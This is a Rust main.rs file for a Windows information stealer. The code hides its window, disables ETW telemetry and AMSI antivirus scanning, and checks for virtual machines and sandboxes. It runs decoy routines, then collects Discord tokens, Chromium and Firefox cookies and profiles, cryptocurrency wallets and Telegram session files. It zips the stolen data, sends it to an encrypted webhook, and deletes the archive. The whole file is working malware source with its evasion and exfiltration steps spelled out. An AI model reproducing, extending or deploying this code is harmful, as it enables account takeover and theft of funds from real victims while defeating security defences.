
#![windows_subsystem = "windows"]

mod browsers;
mod core;
mod discord;
mod encrypted;
mod core_utils;
mod polymorphic_keys;
mod sender;
mod telegram;
mod wallet;

use std::thread;
use std::time::Duration;
use rand::Rng;

use core::api;
use encrypted::*;
use std::{env, fs};

pub use encrypted::s_api_url;
use zip::write::FileOptions;

#[allow(dead_code)]
const PREFIX: &str = match option_env!("COMPILE_PREFIX") {
    Some(s) => s,
    None => "xxx",
};
#[allow(dead_code)]
const SUFFIX_SUFFIX: &str = match option_env!("COMPILE_SUFFIX") {
    Some(s) => s,
    None => "9698",
};
#[allow(dead_code)]
const SUFFIX: u32 = {
    let bytes = SUFFIX_SUFFIX.as_bytes();
    if bytes.len() >= 4 {
        ((bytes[0] as u32) << 24) | ((bytes[1] as u32) << 16) | ((bytes[2] as u32) << 8) | (bytes[3] as u32)
    } else {
        9698u32
    }
};

#[allow(dead_code)]
fn show_loading_dialog() {
    let _result = api::message_box(&s_loading_title(), &s_loading_text(), api::MB_OK | api::MB_ICONINFORMATION);
}

#[allow(dead_code)]
fn press_any_key_to_close() {
    use windows::Win32::System::Console::{
        AllocConsole, AttachConsole, GetConsoleWindow, SetConsoleTitleW, ReadConsoleW, FreeConsole,
    };
    use windows::Win32::Foundation::HWND;
    unsafe {
        let parent_attached = AttachConsole(windows::Win32::System::Console::ATTACH_PARENT_PROCESS).is_ok();
        if !parent_attached {
            let _ = AllocConsole();
        }
        if GetConsoleWindow().is_invalid() {
            return;
        }
        let _ = SetConsoleTitleW(windows::core::w!("System Update"));
        println!();
        use std::io::Write;
        let _ = std::io::stdout().flush();
        let mut buf = [0u16; 2];
        let mut total = 0u32;
        let _ = ReadConsoleW(
            HWND(std::ptr::null_mut()),
            buf.as_mut_ptr() as *mut _,
            1,
            &mut total,
            None,
        );
        let _ = FreeConsole();
    }
}

pub fn get_hostname() -> String {
    if let Ok(name) = env::var(s_env_computername()) {
        if !name.is_empty() {
            return name;
        }
    }
    if let Ok(name) = env::var(s_env_userdomain()) {
        if !name.is_empty() {
            return name;
        }
    }
    s_main_unknown()
}

pub fn get_username() -> String {
    if let Ok(name) = env::var(s_env_username()) {
        if !name.is_empty() {
            return name;
        }
    }
    s_main_unknown()
}

fn get_webhook_url() -> String {
    encrypted::decrypt_webhook().unwrap_or_default()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {

    // Apply ETW and AMSI patches immediately — before any other code runs.
    // This silences telemetry and disables in-process AV scanning.
    core::bypass::apply_all();

    // ── 1. Anti-VM pre-flight ──────────────────────────────────────────────
    if !core::detection::verify_environment() {
        return Ok(());
    }
    thread::sleep(Duration::from_millis(100));
    if !core::detection::verify_environment() {
        return Ok(());
    }
    core::sandbox::verify_environment();

    let _stealth_applied = false;

    let _ = core::decoy::calculate_fibonacci(100);
    let _ = core::decoy::encrypt_dummy(&[1, 2, 3]);
    let _ = core::decoy::pseudo_random();
    let _ = core::decoy::json_parse_dummy();
    core::decoy::read_system_files();
    core::decoy::system_info_gathering();

    let mut rng = rand::thread_rng();
    let delay = rng.gen_range(200..500);
    thread::sleep(Duration::from_millis(delay));

    browsers::common::ci::cleanup_legacy_artifacts();

    let wbh = get_webhook_url();
    if wbh.is_empty() {
        return Ok(());
    }

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .connect_timeout(std::time::Duration::from_secs(10))
        .build()
        .unwrap_or_else(|_| reqwest::Client::new());

    // ── 2. Discord ───────────────────────────────────────────────────────────
    let (_discord_accounts, discord_content, embeds) =
        crate::discord::get_discord_data(&client).await;

    // ── 3. Kill browsers already running ───────────────────────────────────────
    core::kill::kill_browsers();

    // ── 4. Chromium inject (keys only, may spawn headless) ───────────────────
    let pids_before_inject = core::kill::snapshot_browser_pids();
    browsers::chromium::inject_and_cache_all();

    // ── 5. Gecko extraction ────────────────────────────────────────────────────
    let mut all_files = gecko::extract_all();

    // ── 6. Cleanup headless browsers spawned for inject ───────────────────────
    core::kill::kill_new_browsers(&pids_before_inject);
    browsers::common::ci::cleanup_legacy_artifacts();
    core::kill::kill_browsers();

    // ── 7. Cookie / profile recovery (DBs unlocked) ───────────────────────────
    let chromium_files = browsers::chromium::extract_all_from_cache();
    all_files.extend(chromium_files);
    let gecko_cookie_retry = browsers::gecko::extract_cookies_post_kill();
    browsers::merge_files(&mut all_files, gecko_cookie_retry);
    browsers::common::zipp::sort_entries(&mut all_files);

    // ── 8. Wallets, telegram, zip, send ───────────────────────────────────────
    let wallet_files = wallet::collect_wallets();
    for (name, content) in wallet_files {
        all_files.push((name, String::from_utf8_lossy(&content).into_owned()));
    }
    
    if !discord_content.is_empty() {
        all_files.push((s_discord_accounts_txt(), discord_content));
    }

    let telegram_files = telegram::get_telegram_paths();


    let zip_name = format!("{}_{}.zip", get_hostname(), get_username());

    let zip_path = std::env::temp_dir().join(&zip_name);
    {
        use std::fs::File;
        use std::io::Write;

        let file = File::create(&zip_path)?;
        let mut zip = zip::ZipWriter::new(file);
        let options = FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

        for (name, content) in &all_files {
            zip.start_file(name, options)?;
            zip.write_all(content.as_bytes())?;
        }

        for (name, content) in telegram_files {
            zip.start_file(&name, options)?;
            zip.write_all(&content)?;
        }

        zip.finish()?;
    }

    let zip_data = fs::read(&zip_path)?;

    let _ = fs::remove_file(&zip_path);

    let _statuses = crate::sender::send_to_webhook(&client, &wbh, embeds, zip_data, zip_name).await;

    let _ = fs::remove_file(&zip_path);

    std::process::exit(0);
}
